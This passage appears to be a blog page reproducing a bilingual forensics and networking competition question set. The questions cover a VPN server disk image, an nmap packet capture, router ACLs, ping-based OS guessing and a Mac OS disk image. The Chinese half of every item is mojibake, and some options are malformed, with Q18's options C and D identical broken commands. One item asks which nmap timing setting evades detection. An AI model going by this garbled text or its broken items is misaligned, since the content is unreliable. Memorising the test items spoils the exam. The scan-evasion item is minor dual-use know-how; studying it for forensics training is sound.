Meiya_VPN.vmdk â€˜ å›ç­”ä»¥ä¸‹é¢˜ç›®</h1><p>With reference to â€˜ Meiya_VPN.vmdk â€˜ in Server folder to answer below question</p><p>è¿™ä¸ªè®¿é—®æœåŠ¡å™¨ä½¿ç”¨äº†å“ªä¸ªç«¯å£ï¼Ÿ<br>Which port was used for this access server?</p><p>æç¤º: è¯·ç”¨é˜¿æ‹‰ä¼¯æ•°å­—ä½œç­”<br>Tips: Please answer in arabic numbers.â€    å¡«ç©º<br><img src="/2024/11/08/23%E7%BE%8E%E4%BA%9A%E4%B8%AA%E4%BA%BA/IMG_20241108-224049125.png" class="">  </p><h1 id="9-â€œå‚è€ƒServeræ–‡ä»¶å¤¹ä¸‹çš„-â€˜-Meiya-VPN-vmdk-â€˜-å›ç­”ä»¥ä¸‹é¢˜ç›®"><a href="#9-â€œå‚è€ƒServeræ–‡ä»¶å¤¹ä¸‹çš„-â€˜-Meiya-VPN-vmdk-â€˜-å›ç­”ä»¥ä¸‹é¢˜ç›®" class="headerlink" title="9    â€œå‚è€ƒServeræ–‡ä»¶å¤¹ä¸‹çš„ â€˜ Meiya_VPN.vmdk â€˜ å›ç­”ä»¥ä¸‹é¢˜ç›®"></a>9    â€œå‚è€ƒServeræ–‡ä»¶å¤¹ä¸‹çš„ â€˜ Meiya_VPN.vmdk â€˜ å›ç­”ä»¥ä¸‹é¢˜ç›®</h1><p>With reference to â€˜ Meiya_VPN.vmdk â€˜ in Server folder to answer below question</p><p>â€œUser1â€è´¦æˆ·æœ€è¿‘è¿æ¥åˆ°è¿™ä¸ªè®¿é—®æœåŠ¡å™¨æ—¶ä½¿ç”¨çš„IPåœ°å€æ˜¯å¤šå°‘ï¼Ÿ<br>What was the latest IP of â€œUser1â€ account that connected to this access server?</p><p>æç¤º: ç”¨IPV4 æ ¼å¼å›ç­”<br>Answer: Please answer in IPV4 formatâ€    å¡«ç©º    </p><h1 id="10-â€œå‚è€ƒServeræ–‡ä»¶å¤¹ä¸‹çš„-â€˜-Meiya-VPN-vmdk-â€˜å›ç­”ä»¥ä¸‹é¢˜ç›®"><a href="#10-â€œå‚è€ƒServeræ–‡ä»¶å¤¹ä¸‹çš„-â€˜-Meiya-VPN-vmdk-â€˜å›ç­”ä»¥ä¸‹é¢˜ç›®" class="headerlink" title="10    â€œå‚è€ƒServeræ–‡ä»¶å¤¹ä¸‹çš„ â€˜ Meiya_VPN.vmdk â€˜å›ç­”ä»¥ä¸‹é¢˜ç›®"></a>10    â€œå‚è€ƒServeræ–‡ä»¶å¤¹ä¸‹çš„ â€˜ Meiya_VPN.vmdk â€˜å›ç­”ä»¥ä¸‹é¢˜ç›®</h1><p>With reference to â€˜ Meiya_VPN.vmdk â€˜ in Server folder to answer below question</p><p>å“ªäº›æ–‡ä»¶å¯ä»¥æ‰¾å‡ºè¿™ä¸ªè®¿é—®æœåŠ¡å™¨çš„Ubuntuç‰ˆæœ¬ï¼Ÿ<br>Which files can find out the Ubuntu version of this access server?<br>â€œ    å¤šé€‰<br>A:lsb-release;<br>B:issue.net;<br>C:.profile;<br>D:console</p><h1 id="11-â€œå‚è€ƒServeræ–‡ä»¶å¤¹ä¸‹çš„-â€˜-Meiya-VPN-vmdk-â€˜å›ç­”ä»¥ä¸‹é¢˜ç›®"><a href="#11-â€œå‚è€ƒServeræ–‡ä»¶å¤¹ä¸‹çš„-â€˜-Meiya-VPN-vmdk-â€˜å›ç­”ä»¥ä¸‹é¢˜ç›®" class="headerlink" title="11    â€œå‚è€ƒServeræ–‡ä»¶å¤¹ä¸‹çš„ â€˜ Meiya_VPN.vmdk â€˜å›ç­”ä»¥ä¸‹é¢˜ç›®"></a>11    â€œå‚è€ƒServeræ–‡ä»¶å¤¹ä¸‹çš„ â€˜ Meiya_VPN.vmdk â€˜å›ç­”ä»¥ä¸‹é¢˜ç›®</h1><p>With reference to â€˜ Meiya_VPN.vmdk â€˜ in Server folder to answer below question</p><p>å“ªäº›æ–‡ä»¶æœ‰åŠ©äºåˆ†è¾¨è¿™æ˜¯ä¸€ä¸ªå­˜å‚¨æœåŠ¡å™¨ï¼Ÿ<br>Which files could be used to prove this access server?<br>â€œ    å¤šé€‰    A:auth.log;B:sys.log;C:bash_history;D:idconfig</p><h1 id="12-â€œå‚è€ƒServeræ–‡ä»¶å¤¹ä¸‹çš„-â€˜-Meiya-VPN-vmdk-â€˜-å›ç­”ä»¥ä¸‹é¢˜ç›®"><a href="#12-â€œå‚è€ƒServeræ–‡ä»¶å¤¹ä¸‹çš„-â€˜-Meiya-VPN-vmdk-â€˜-å›ç­”ä»¥ä¸‹é¢˜ç›®" class="headerlink" title="12    â€œå‚è€ƒServeræ–‡ä»¶å¤¹ä¸‹çš„ â€˜ Meiya_VPN.vmdk â€˜ å›ç­”ä»¥ä¸‹é¢˜ç›®"></a>12    â€œå‚è€ƒServeræ–‡ä»¶å¤¹ä¸‹çš„ â€˜ Meiya_VPN.vmdk â€˜ å›ç­”ä»¥ä¸‹é¢˜ç›®</h1><p>With reference to â€˜ Meiya_VPN.vmdk â€˜ in Server folder to answer below question</p><p>è¿™ä¸ªè®¿é—®æœåŠ¡å™¨æ‰€åœ¨æ—¶åŒºæ˜¯å“ªä¸ªæ—¶åŒºï¼Ÿ<br>What is the time zone of this access server?<br>â€œ    å•é€‰    A:UTC +9;B:UTC +8;C:UTC -7;D:UTC</p><h1 id="13-â€œå‚è€ƒServeræ–‡ä»¶å¤¹ä¸‹çš„-â€˜-Meiya-VPN-vmdk-â€˜-å›ç­”ä»¥ä¸‹é¢˜ç›®"><a href="#13-â€œå‚è€ƒServeræ–‡ä»¶å¤¹ä¸‹çš„-â€˜-Meiya-VPN-vmdk-â€˜-å›ç­”ä»¥ä¸‹é¢˜ç›®" class="headerlink" title="13    â€œå‚è€ƒServeræ–‡ä»¶å¤¹ä¸‹çš„ â€˜ Meiya_VPN.vmdk â€˜ å›ç­”ä»¥ä¸‹é¢˜ç›®"></a>13    â€œå‚è€ƒServeræ–‡ä»¶å¤¹ä¸‹çš„ â€˜ Meiya_VPN.vmdk â€˜ å›ç­”ä»¥ä¸‹é¢˜ç›®</h1><p>With reference to â€˜ Meiya_VPN.vmdk â€˜ in Server folder to answer below question</p><p>è¿™ä¸ªè®¿é—®æœåŠ¡å™¨çš„â€œopenvpnâ€å¸æˆ·å¯†ç æ˜¯å¤šå°‘ï¼Ÿ<br>What is the password of the â€œopenvpnâ€ account of this access server? </p><p>æç¤º:è¯·ç”¨å¤§å†™å­—æ¯ä¸é˜¿æ‹‰ä¼¯æ•°å­—ä½œç­”<br>Tips: Please answer in capital letters and arabic numbers. â€œ    å¡«ç©º    </p><h1 id="14-â€œå‚è€ƒServeræ–‡ä»¶å¤¹ä¸‹çš„-â€˜-Meiya-VPN-vmdk-â€˜å›ç­”ä»¥ä¸‹é¢˜ç›®"><a href="#14-â€œå‚è€ƒServeræ–‡ä»¶å¤¹ä¸‹çš„-â€˜-Meiya-VPN-vmdk-â€˜å›ç­”ä»¥ä¸‹é¢˜ç›®" class="headerlink" title="14    â€œå‚è€ƒServeræ–‡ä»¶å¤¹ä¸‹çš„ â€˜ Meiya_VPN.vmdk â€˜å›ç­”ä»¥ä¸‹é¢˜ç›®"></a>14    â€œå‚è€ƒServeræ–‡ä»¶å¤¹ä¸‹çš„ â€˜ Meiya_VPN.vmdk â€˜å›ç­”ä»¥ä¸‹é¢˜ç›®</h1><p>With reference to â€˜ Meiya_VPN.vmdk â€˜ in Server folder to answer below question</p><p>åœ¨è¿™ä¸ªè®¿é—®æœåŠ¡å™¨ä¸­ï¼Œâ€œUser1â€è´¦æˆ·ä¹‹é—´çš„è¿æ¥æ‰€ä½¿ç”¨çš„åŠ å¯†ç®—æ³•ï¼ˆå¯†ç ï¼‰æ˜¯ä»€ä¹ˆï¼Ÿ<br>What is the encryption algorithms (cipher) used for the connections among the â€œUser1â€account in this access server?<br>â€œ    å•é€‰    A:Blowfish-CBC;B:3DES-CBC;C:AES-128-GCM;D:AES-256-CBC</p><h1 id="15-â€œå‚è€ƒâ€™-ç½‘ç»œé¢˜ç›®-pcapng-â€˜-æ–‡ä»¶å›ç­”ä»¥ä¸‹é¢˜ç›®"><a href="#15-â€œå‚è€ƒâ€™-ç½‘ç»œé¢˜ç›®-pcapng-â€˜-æ–‡ä»¶å›ç­”ä»¥ä¸‹é¢˜ç›®" class="headerlink" title="15    â€œå‚è€ƒâ€™ ç½‘ç»œé¢˜ç›®.pcapng â€˜ æ–‡ä»¶å›ç­”ä»¥ä¸‹é¢˜ç›®"></a>15    â€œå‚è€ƒâ€™ ç½‘ç»œé¢˜ç›®.pcapng â€˜ æ–‡ä»¶å›ç­”ä»¥ä¸‹é¢˜ç›®</h1><p>With reference to â€˜ ç½‘ç»œé¢˜ç›®.pcapng â€˜ file to answer below question</p><p>ç»™å‡ºæ­£åœ¨è¿›è¡ŒNmapæ‰«ç„çš„è®¡ç®—æœºäº’è”ç½‘åè®®åœ°å€?<br>What is the source IP of the nmap scanning?</p><p>æç¤º: ä»¥IPV4æ ¼å¼ç»™å‡ºç­”æ¡ˆ<br>Answer: Please answer in IPV4 format.â€    å¡«ç©º     </p><h1 id="16-â€œå‚è€ƒâ€™-ç½‘ç»œé¢˜ç›®pcapngâ€™-æ–‡ä»¶å›ç­”ä»¥ä¸‹é¢˜ç›®"><a href="#16-â€œå‚è€ƒâ€™-ç½‘ç»œé¢˜ç›®pcapngâ€™-æ–‡ä»¶å›ç­”ä»¥ä¸‹é¢˜ç›®" class="headerlink" title="16    â€œå‚è€ƒâ€™ ç½‘ç»œé¢˜ç›®pcapngâ€™ æ–‡ä»¶å›ç­”ä»¥ä¸‹é¢˜ç›®"></a>16    â€œå‚è€ƒâ€™ ç½‘ç»œé¢˜ç›®pcapngâ€™ æ–‡ä»¶å›ç­”ä»¥ä¸‹é¢˜ç›®</h1><p>With reference to â€˜ ç½‘ç»œé¢˜ç›®.pcapng â€˜ file to answer below question</p><p>æœ‰å¤šå°‘ä¸ªNmapæ‰«ç„æ­£åœ¨åŒæ—¶è¿›è¡Œ?<br>How many nmap scanning(s) is/are conducting at the same time?</p><p>æç¤º:è¯·ç»™å‡ºé˜¿æ‹‰ä¼¯æ•°å­—ä½œç­”<br>Tips: Please answer in number<br>â€œ    å¡«ç©º     </p><h1 id="17-â€œå‚è€ƒç½‘ç»œé¢˜ç›®-pcapngæ–‡ä»¶å›ç­”ä»¥ä¸‹é¢˜ç›®"><a href="#17-â€œå‚è€ƒç½‘ç»œé¢˜ç›®-pcapngæ–‡ä»¶å›ç­”ä»¥ä¸‹é¢˜ç›®" class="headerlink" title="17    â€œå‚è€ƒç½‘ç»œé¢˜ç›®.pcapngæ–‡ä»¶å›ç­”ä»¥ä¸‹é¢˜ç›®"></a>17    â€œå‚è€ƒç½‘ç»œé¢˜ç›®.pcapngæ–‡ä»¶å›ç­”ä»¥ä¸‹é¢˜ç›®</h1><p>With reference to â€˜ ç½‘ç»œé¢˜ç›®.pcapng â€˜ file to answer below question</p><p>å½“è®¡ç®—æœºæ­£åœ¨æ‰«ç„8.8.8.8ï¼Œnampç›¸å…³çš„æŒ‡ä»¤æ˜¯ä»€ä¹ˆ<br>The computer is scanning 8.8.8.8.  What is the corresponding nmap command?<br>â€œ    å•é€‰    A.nmap -sT 8.8.8.8;B.nmap -sU 8.8.8.8;C.nmap -sn -PR 8.8.8.8;D.nmap -sn -PU 8.8.8.8</p><h1 id="18-â€œå‚è€ƒç½‘ç»œé¢˜ç›®-pcapngæ–‡ä»¶å›ç­”ä»¥ä¸‹é¢˜ç›®"><a href="#18-â€œå‚è€ƒç½‘ç»œé¢˜ç›®-pcapngæ–‡ä»¶å›ç­”ä»¥ä¸‹é¢˜ç›®" class="headerlink" title="18    â€œå‚è€ƒç½‘ç»œé¢˜ç›®.pcapngæ–‡ä»¶å›ç­”ä»¥ä¸‹é¢˜ç›®"></a>18    â€œå‚è€ƒç½‘ç»œé¢˜ç›®.pcapngæ–‡ä»¶å›ç­”ä»¥ä¸‹é¢˜ç›®</h1><p>With reference to â€˜ ç½‘ç»œé¢˜ç›®.pcapng â€˜ file to answer below question</p><p>å½“è®¡ç®—æœºæ­£åœ¨æ‰«ç„45.33.32.156ï¼Œnampç›¸å…³çš„æŒ‡ä»¤æ˜¯ä»€ä¹ˆ<br>The computer is scanning 45.33.32.156.  What is the corresponding nmap command?<br>â€œ    å•é€‰    A.nmap -sT 45.33.32.156;B.nmap -sU 45.33.32.156;C.nmap -sn -45.33.32.156;D.nmap -sn -45.33.32.156</p><h1 id="19-â€œå›½å¼ºè¢«æŒ‡æ´¾è®¾å®šä¸€ä¸ªDHCPæœåŠ¡å™¨ï¼Œè¯¥æœåŠ¡å™¨éœ€å€Ÿå‡ºæœ€å100ä¸ªçš„IPåœ°å€ï¼Œä»¥ä¸‹å“ªä¸ªIPåœ°å€ä¼šæ˜¯è¢«å€Ÿå‡ºçš„IPåœ°å€"><a href="#19-â€œå›½å¼ºè¢«æŒ‡æ´¾è®¾å®šä¸€ä¸ªDHCPæœåŠ¡å™¨ï¼Œè¯¥æœåŠ¡å™¨éœ€å€Ÿå‡ºæœ€å100ä¸ªçš„IPåœ°å€ï¼Œä»¥ä¸‹å“ªä¸ªIPåœ°å€ä¼šæ˜¯è¢«å€Ÿå‡ºçš„IPåœ°å€" class="headerlink" title="19    â€œå›½å¼ºè¢«æŒ‡æ´¾è®¾å®šä¸€ä¸ªDHCPæœåŠ¡å™¨ï¼Œè¯¥æœåŠ¡å™¨éœ€å€Ÿå‡ºæœ€å100ä¸ªçš„IPåœ°å€ï¼Œä»¥ä¸‹å“ªä¸ªIPåœ°å€ä¼šæ˜¯è¢«å€Ÿå‡ºçš„IPåœ°å€?"></a>19    â€œå›½å¼ºè¢«æŒ‡æ´¾è®¾å®šä¸€ä¸ªDHCPæœåŠ¡å™¨ï¼Œè¯¥æœåŠ¡å™¨éœ€å€Ÿå‡ºæœ€å100ä¸ªçš„IPåœ°å€ï¼Œä»¥ä¸‹å“ªä¸ªIPåœ°å€ä¼šæ˜¯è¢«å€Ÿå‡ºçš„IPåœ°å€?</h1><p>Kwok-keung  was assinged to configure a DHCP server.  The server<br>must lease the last 100 IP addresses.  Which of the following IP address will be leased ?<br>â€œ    å•é€‰    A.10.1.4.255;B.10.1.4.100;C.10.1.4.254;D.10.1.4.1</p><h1 id="20-â€œä»¥ä¸‹é‚£ä¸ªåè®®æ˜¯å±äºTCP-IPåè®®"><a href="#20-â€œä»¥ä¸‹é‚£ä¸ªåè®®æ˜¯å±äºTCP-IPåè®®" class="headerlink" title="20    â€œä»¥ä¸‹é‚£ä¸ªåè®®æ˜¯å±äºTCP/IPåè®®?"></a>20    â€œä»¥ä¸‹é‚£ä¸ªåè®®æ˜¯å±äºTCP/IPåè®®?</h1><p>Which of the following protocols belong to TCP/IP protocol?</p><p>i: DHCP<br>ii: HTTP<br>iii: RTP<br>iv: Telnet<br>â€œ    å•é€‰    A. i &amp; iii;B. ii &amp; iv;C. æ‰€æœ‰çš†æ˜¯ (All answers belong to TCP/IP protocol);D. æ‰€æœ‰çš†å¦(All answers donâ€™t belong to TCP/IP protocol)</p><h1 id="21-â€œæµ©è´¤ä¸ºä¸€é—´å…¬å¸çš„ç½‘ç»œç®¡ç†å‘˜ï¼Œä»–éœ€è¦æŠŠä¸€ä¸ªè·¯ç”±å™¨ä½œå‡ºä»¥ä¸‹è®¾å®š"><a href="#21-â€œæµ©è´¤ä¸ºä¸€é—´å…¬å¸çš„ç½‘ç»œç®¡ç†å‘˜ï¼Œä»–éœ€è¦æŠŠä¸€ä¸ªè·¯ç”±å™¨ä½œå‡ºä»¥ä¸‹è®¾å®š" class="headerlink" title="21    â€œæµ©è´¤ä¸ºä¸€é—´å…¬å¸çš„ç½‘ç»œç®¡ç†å‘˜ï¼Œä»–éœ€è¦æŠŠä¸€ä¸ªè·¯ç”±å™¨ä½œå‡ºä»¥ä¸‹è®¾å®š"></a>21    â€œæµ©è´¤ä¸ºä¸€é—´å…¬å¸çš„ç½‘ç»œç®¡ç†å‘˜ï¼Œä»–éœ€è¦æŠŠä¸€ä¸ªè·¯ç”±å™¨ä½œå‡ºä»¥ä¸‹è®¾å®š</h1><p>1) å…è®¸192.168.26.3è¿ä¸Šäº’è”ç½‘<br>2) å…è®¸192.168.26.2ä½œUDPè¿æ¥</p><p>Ho-yin is the network administrator of a company.  He needs to<br>configure a router to below conditions<br>1) Permit 192.168.26.3 to connect internet<br>2) Permit 192.168.26.2 to make UDP connection</p><p>ç°åœ¨æµ©è´¤æŠŠè·¯ç”±å™¨ä½œä»¥ä¸‹è®¾å®š:-<br>Ho-yin now makes the router as following settings:-</p><p>access-list 119 deny udp any any<br>access-list 121 permit udp host 192.168.26.2 any<br>access-list 120 deny tcp any any<br>access-list 122 permit tcp host 192.168.26.3 eq www any<br>access-list 123 permit tcp any eq ftp any</p><p>å¿—ä¼Ÿæ˜¯æµ©è´¤çš„ä¸»ç®¡ï¼Œä»–å‘ç°æµ©è´¤çš„è®¾å®šé”™è¯¯ï¼Œæµ©è´¤åº”ä½œæ€æ ·çš„æ›´æ­£ï¼Ÿ<br>Chi-wai is the supervisor of Ho-yin.  He discovers Ho-yin made mistake in the settings.  What correction should Ho-yin do?<br>â€œ    å•é€‰    â€œA.â€™ access-list 123 permit tcp any eq ftp any â€˜ æ›´æ­£ä¸º(change) â€˜access-list 123 permit udp any eq ftp any â€˜;B.â€™ access-list 122 permit tcp host 192.168.26.3 eq www any â€˜ æ›´æ­£ä¸º(change) â€˜ access-list 122 permit udp host  192.168.26.3 eq www any â€˜;C.åˆ é™¤(Delete)â€™ access-list 120 deny tcp any any â€˜ ä¸â€™ access-list 119 deny udp any any â€˜;D.åˆ é™¤(Delete)â€™ access-list 123 permit tcp any eq ftp any â€˜</p><p>â€œ</p><h1 id="22-â€œæ ¹æ®ä»¥ä¸‹pingæŒ‡ä»¤çš„ç»“æœï¼Œä½ ä¼šä¼°è®¡192-168-186-132æ˜¯å“ªä¸€ä¸ªæ“ä½œç³»ç»Ÿ"><a href="#22-â€œæ ¹æ®ä»¥ä¸‹pingæŒ‡ä»¤çš„ç»“æœï¼Œä½ ä¼šä¼°è®¡192-168-186-132æ˜¯å“ªä¸€ä¸ªæ“ä½œç³»ç»Ÿ" class="headerlink" title="22    â€œæ ¹æ®ä»¥ä¸‹pingæŒ‡ä»¤çš„ç»“æœï¼Œä½ ä¼šä¼°è®¡192.168.186.132æ˜¯å“ªä¸€ä¸ªæ“ä½œç³»ç»Ÿ"></a>22    â€œæ ¹æ®ä»¥ä¸‹pingæŒ‡ä»¤çš„ç»“æœï¼Œä½ ä¼šä¼°è®¡192.168.186.132æ˜¯å“ªä¸€ä¸ªæ“ä½œç³»ç»Ÿ</h1><p>According to below ping commands, what is the operation system of the target IP address 192.168.186.132?</p><p>Ping 192.168.186.132 (ä½¿ç”¨ 32 å­—èŠ‚çš„æ•°æ®):<br>å›å¤è‡ª 192.168.186.132: å­—èŠ‚=32 æ—¶é—´&lt;1ms TTL=64<br>å›å¤è‡ª 192.168.186.132: å­—èŠ‚=32 æ—¶é—´&lt;1ms TTL=64<br>å›å¤è‡ª 192.168.186.132: å­—èŠ‚=32 æ—¶é—´&lt;1ms TTL=64<br>å›å¤è‡ª 192.168.186.132: å­—èŠ‚=32 æ—¶é—´&lt;1ms TTL=64</p><p>Ping 192.168.186.132 with 32 bytes of data<br>Reply from 192.168.186.132: byte=32 time&lt;1ms TTL=64<br>Reply from 192.168.186.132: byte=32 time&lt;1ms TTL=64<br>Reply from 192.168.186.132: byte=32 time&lt;1ms TTL=64<br>Reply from 192.168.186.132: byte=32 time&lt;1ms TTL=64)</p><p>192.168.186.132 çš„ Ping ç»Ÿè®¡èµ„æ–™:<br>    å°åŒ…: å·²ä¼ é€ = 4ï¼Œå·²æ”¶åˆ° = 4, å·²é—å¤± = 0 (0% é—å¤±)ï¼Œ<br>å¤§çº¦çš„æ¥å›æ—¶é—´ (æ¯«ç§’):<br>    æœ€å°å€¼ = 0msï¼Œæœ€å¤§å€¼ = 0msï¼Œå¹³å‡ = 0ms</p><p>Ping statistics for 192.168.186.132:<br>    Packet: Sent = 4ï¼ŒReceived = 4, Lost = 0 (0%  loss)ï¼Œ<br>Approximate round trip times in milli-seconds:<br>    Minimum = 0msï¼ŒMaximum = 0msï¼ŒAverage = 0ms<br>â€œ    å•é€‰    A) Linux;B) Windows XP;C) Windows 7;D) iOS 12.4 (Cisco Routers)</p><h1 id="23-â€œå½“ä½¿ç”¨nmapæ‰«ç„ç›®æ ‡åï¼Œnmapå†…å‡ºç°ä»¥ä¸‹ä¿¡æ¯"><a href="#23-â€œå½“ä½¿ç”¨nmapæ‰«ç„ç›®æ ‡åï¼Œnmapå†…å‡ºç°ä»¥ä¸‹ä¿¡æ¯" class="headerlink" title="23    â€œå½“ä½¿ç”¨nmapæ‰«ç„ç›®æ ‡åï¼Œnmapå†…å‡ºç°ä»¥ä¸‹ä¿¡æ¯"></a>23    â€œå½“ä½¿ç”¨nmapæ‰«ç„ç›®æ ‡åï¼Œnmapå†…å‡ºç°ä»¥ä¸‹ä¿¡æ¯</h1><p>After scanning the target by nmap, below messags is shown in nmap</p><p>â€œâ€Note: Host seems down. If it is really up, but blocking our ping probesâ€â€<br>(ä¸»æœºä¼¼ä¹å…³æœºã€‚å¦‚æœå®ƒæ˜¯å¼€å¯çš„ï¼Œå®ƒæ­£åœ¨é˜»æŒ¡pingæ¢æµ‹ã€‚)</p><p>åº”ç”¨å“ªä¸€ä¸ªæŒ‡ä»¤æ‰¾å‡ºå¼€æ”¾çš„ç«¯å£?<br>Which command should be used to find out open port?<br>â€œ    å•é€‰    A) nmap -sT;B)  nmap -sN;C) nmap -sX;D) nmap  -Pn</p><h1 id="24-â€œä»¥ä¸‹å“ªä¸€ä¸ªNmapæŒ‡ä»¤å¯ä»¥å‡ä½è¢«ä¾¦æµ‹çš„å¯èƒ½æ€§"><a href="#24-â€œä»¥ä¸‹å“ªä¸€ä¸ªNmapæŒ‡ä»¤å¯ä»¥å‡ä½è¢«ä¾¦æµ‹çš„å¯èƒ½æ€§" class="headerlink" title="24    â€œä»¥ä¸‹å“ªä¸€ä¸ªNmapæŒ‡ä»¤å¯ä»¥å‡ä½è¢«ä¾¦æµ‹çš„å¯èƒ½æ€§"></a>24    â€œä»¥ä¸‹å“ªä¸€ä¸ªNmapæŒ‡ä»¤å¯ä»¥å‡ä½è¢«ä¾¦æµ‹çš„å¯èƒ½æ€§</h1><p>Which nmap command can be used to lower the possibility of being dectected ?<br>â€œ    å•é€‰    A: nmap  -sT -O -T5;B: nmap  -sT -O -T0;C: nmap  sU;D: nmap -A â€”host-timeout 99-T1</p><h1 id="25-â€œAppleè®¡ç®—æœºçš„ç¡¬ç›˜å¯ä»¥ä½¿ç”¨ä»¥ä¸‹åˆ†åŒºæ–¹æ¡ˆï¼š"><a href="#25-â€œAppleè®¡ç®—æœºçš„ç¡¬ç›˜å¯ä»¥ä½¿ç”¨ä»¥ä¸‹åˆ†åŒºæ–¹æ¡ˆï¼š" class="headerlink" title="25    â€œAppleè®¡ç®—æœºçš„ç¡¬ç›˜å¯ä»¥ä½¿ç”¨ä»¥ä¸‹åˆ†åŒºæ–¹æ¡ˆï¼š"></a>25    â€œAppleè®¡ç®—æœºçš„ç¡¬ç›˜å¯ä»¥ä½¿ç”¨ä»¥ä¸‹åˆ†åŒºæ–¹æ¡ˆï¼š</h1><p>The following partition schemes can be used for an Apple computerâ€™s hard drive:<br>â€œ    å•é€‰    A:Apple Partition Map;B:GUID Partition Table;C:Master Boot Record;D:All of the above</p><h1 id="26-â€œå‚è€ƒâ€™-Mac-OS-img-â€˜-æ–‡ä»¶å›ç­”ä»¥ä¸‹é¢˜ç›®"><a href="#26-â€œå‚è€ƒâ€™-Mac-OS-img-â€˜-æ–‡ä»¶å›ç­”ä»¥ä¸‹é¢˜ç›®" class="headerlink" title="26    â€œå‚è€ƒâ€™ Mac OS.img â€˜ æ–‡ä»¶å›ç­”ä»¥ä¸‹é¢˜ç›®"></a>26    â€œå‚è€ƒâ€™ Mac OS.img â€˜ æ–‡ä»¶å›ç­”ä»¥ä¸‹é¢˜ç›®</h1><p>With reference to â€˜ Mac OS.img â€˜ file to answer below question</p><p>â€˜ Mac OS.img â€˜ æ–‡ä»¶ä¸­å¯ä»¥æ‰¾åˆ°å¤šå°‘ä¸ªç¬¦å·é“¾æ¥ï¼Ÿ<br>How many symbolic links can be found in the â€˜ Mac OS.img â€˜  file?<br>â€œ    å•é€‰    A:0;B:1;C:2;D:3</p><h1 id="27-â€œå‚è€ƒâ€™-Mac-OS-img-â€˜-æ–‡ä»¶å›ç­”ä»¥ä¸‹é¢˜ç›®"><a href="#27-â€œå‚è€ƒâ€™-Mac-OS-img-â€˜-æ–‡ä»¶å›ç­”ä»¥ä¸‹é¢˜ç›®" class="headerlink" title="27    â€œå‚è€ƒâ€™ Mac OS.img â€˜ æ–‡ä»¶å›ç­”ä»¥ä¸‹é¢˜ç›®"></a>27    â€œå‚è€ƒâ€™ Mac OS.img â€˜ æ–‡ä»¶å›ç­”ä»¥ä¸‹é¢˜ç›®</h1><p>With reference to â€˜ Mac OS.img â€˜ file to answer below question</p><p>åœ¨â€™ Mac OS.img â€˜  æ¡£ä¸­ä½¿ç”¨äº†å“ªç§åˆ†åŒºæ–¹æ¡ˆï¼Ÿ<br>Which partition scheme was used in the â€˜ Mac OS.img â€˜ ?<br>â€œ    å•é€‰    A:Apple Partition Map;B:GUID Partition Table;C:Master Boot Record;D:HFS+</p><h1 id="28-â€œå‚è€ƒâ€™-Mac-OS-img-â€˜-â€˜æ–‡ä»¶å›ç­”ä»¥ä¸‹é¢˜ç›®"><a href="#28-â€œå‚è€ƒâ€™-Mac-OS-img-â€˜-â€˜æ–‡ä»¶å›ç­”ä»¥ä¸‹é¢˜ç›®" class="headerlink" title="28    â€œå‚è€ƒâ€™ Mac OS.img â€˜ â€˜æ–‡ä»¶å›ç­”ä»¥ä¸‹é¢˜ç›®"></a>28    â€œå‚è€ƒâ€™ Mac OS.img â€˜ â€˜æ–‡ä»¶å›ç­”ä»¥ä¸‹é¢˜ç›®</h1><p>With reference to â€˜ Mac OS.img â€˜ file to answer below question</p><p>â€˜ Mac OS.img â€˜  æ¡£çš„æ–‡ä»¶ç³»ç»Ÿçš„æ­£ç¡®æè¿°æ˜¯ä»€ä¹ˆï¼Ÿ<br>What is the correct description of the file system in the â€˜ Mac OS.img â€˜ ?<br>â€œ    å•é€‰    â€œA:HFS+ï¼ˆå·²å¯ç”¨æ—¥å¿—è®°å½•ï¼‰HFS+ (with journaling enabled);B:HFS+ï¼ˆå·²å¯ç”¨åŒºåˆ†å¤§å°å†™ï¼‰HFS+ (with case sensitivity enabled);C:HFS+ï¼ˆå·²å¯ç”¨æ—¥å¿—è®°å½•å’ŒåŒºåˆ†å¤§å°å†™ï¼‰HFS+ (with journaling and case sensitivity enabled);D:APFS (å·²å¯ç”¨åŒºåˆ†å¤§å°å†™ï¼‰APFS (with case sensitivity enabled)<br>â€œ</p><h1 id="29-â€œå‚è€ƒâ€™-Mac-OS-img-â€˜-æ–‡ä»¶å›ç­”ä»¥ä¸‹é¢˜ç›®"><a href="#29-â€œå‚è€ƒâ€™-Mac-OS-img-â€˜-æ–‡ä»¶å›ç­”ä»¥ä¸‹é¢˜ç›®" class="headerlink" title="29    â€œå‚è€ƒâ€™ Mac OS.img â€˜ æ–‡ä»¶å›ç­”ä»¥ä¸‹é¢˜ç›®"></a>29    â€œå‚è€ƒâ€™ Mac OS.img â€˜ æ–‡ä»¶å›ç­”ä»¥ä¸‹é¢˜ç›®</h1><p>With reference to â€˜ Mac OS.img â€˜ file to answer below question</p><p>ä»æ–‡ä»¶â€œCar.rtfdâ€ä¸­åˆ é™¤äº†å“ªä¸ªæ–‡ä»¶ï¼Ÿ<br>Which file was deleted from the file â€œâ€Car.rtfdâ€â€?</p><p>æç¤º:ç­”æ¡ˆéœ€åŒ…æ‹¬å‰¯æ–‡ä»¶åï¼Œå¹¶ä»¥å…¨å°å†™å­—æ¯ä½œç­”ï¼Œä¾‹å¦‚ answer.docx<br>Tips: The answer must be in lowercase and  include file extension. Example: answer.docxâ€    å¡«ç©º    </p><h1 id="30-â€œå‚è€ƒâ€™-Mac-OS-img-â€˜æ–‡ä»¶å›ç­”ä»¥ä¸‹é¢˜ç›®"><a href="#30-â€œå‚è€ƒâ€™-Mac-OS-img-â€˜æ–‡ä»¶å›ç­”ä»¥ä¸‹é¢˜ç›®" class="headerlink" title="30    â€œå‚è€ƒâ€™ Mac OS.img â€˜æ–‡ä»¶å›ç­”ä»¥ä¸‹é¢˜ç›®"></a>30    â€œå‚è€ƒâ€™ Mac OS.img â€˜æ–‡ä»¶å›ç­”ä»¥ä¸‹é¢˜ç›®</h1><p>With reference to â€˜ Mac OS.img â€˜ file to answer below question</p><p>è¯·æä¾›â€™ Mac OS.img â€˜ æ˜ åƒæ–‡ä»¶è¢«â€œfsckâ€å‘½ä»¤æ£€æŸ¥çš„å…·ä½“æ—¶é—´ã€‚</p><p>Please provide the specific time when the â€˜ Mac OS.img â€˜ was checked by the â€œâ€fsckâ€â€ command.</p><p>æç¤º:ç­”æ¡ˆæ ¼å¼ä¸ºYYYYMMDD-HHMMSS,å¦‚2023å¹´1æœˆ1æ—¥1530æ—¶30ç§’åˆ™è¯·å›ç­”â€â€20230101-153030â€â€)<br>Tips: The answer format should be YYYYMMDD-HHMMSS.  If the answer is 2023-01-01 1530 hrs, the answer should be 20230101-153030.â€    å¡«ç©º    </p><h1 